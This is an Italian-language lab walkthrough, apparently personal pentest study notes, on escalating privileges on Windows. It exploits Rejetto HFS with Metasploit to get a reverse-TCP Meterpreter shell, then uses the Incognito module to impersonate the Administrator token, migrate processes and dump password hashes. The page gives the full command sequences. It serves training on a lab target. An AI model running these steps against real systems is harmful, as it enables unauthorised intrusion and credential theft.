---
description: >-
  Questa tecnica funziona con qualsiasi versione di Windows posto che vi sia
  attivo il SeImpersonatePrivilege ed il token da impersonare disponibile sul
  target
---

# Windows Privilege Escalation: Token Impersonation With Incognito

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Senza i Windows Access Token dovremmo inserire username e password ogni volta che lanciamo un programma, non solo all'ingresso nell'utente Windows.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration & Exploitation per accesso target

```
service postgresql start && msfconsole
workspace -a Impersonate
workspace
setg RHOSTS 10.2.16.112
db_nmap -sV 10.2.16.112
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set patload windows/x64/meterpreter/reverse_tcp
show options
exploit
getuid
getprivs //Abbiamo SeImpersonatePrivilege quindi possiamo impersonare un token
hashdump //per dimostrare che fallisce e non abbiamo i permessi
cd C:\\Users
cd Administrator //fallisce, non abbiamo i permessi
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

La sessione meterpreter è già x64 quindi non dobbiamo migrare ad un altro processo.

<figure><img src="../../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

NT AUTHORITY\LOCAL SERVICE significa che abbiamo i permessi associati ad un servizio running in locale (local service), e il motivo per il quale abbiamo questo account è perché abbiamo exploitato un servizio (hfs rejetto http file server service).

<figure><img src="../../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo SeImpersonatePrivilege quindi possiamo impersonare un token.

<figure><img src="../../../.gitbook/assets/image (1176).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation con Incognito module

```
load incognito
list tokens -u //per gli user access tokens: mostra sia delegation che impersonation tokens
impersonate_token "ATTACKDEFENSE\Administrator" //che è uno dei delegation token disponibili
getuid
hashdump //fallsice perché dobbiamo migrare il processo, perché il processo nel quale siamo è ancora associato all'utente LOCAL SERVICE
ps
migrate 3544 //per migrare a explorer.exe
hashdump //ora ci mostra gli hash
cd C:\\
cd Users
cd Administrator
dir //ora abbiamo accesso alla cartella Administrator
```

<figure><img src="../../../.gitbook/assets/image (1177).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1178).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1179).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1180).png" alt=""><figcaption></figcaption></figure>
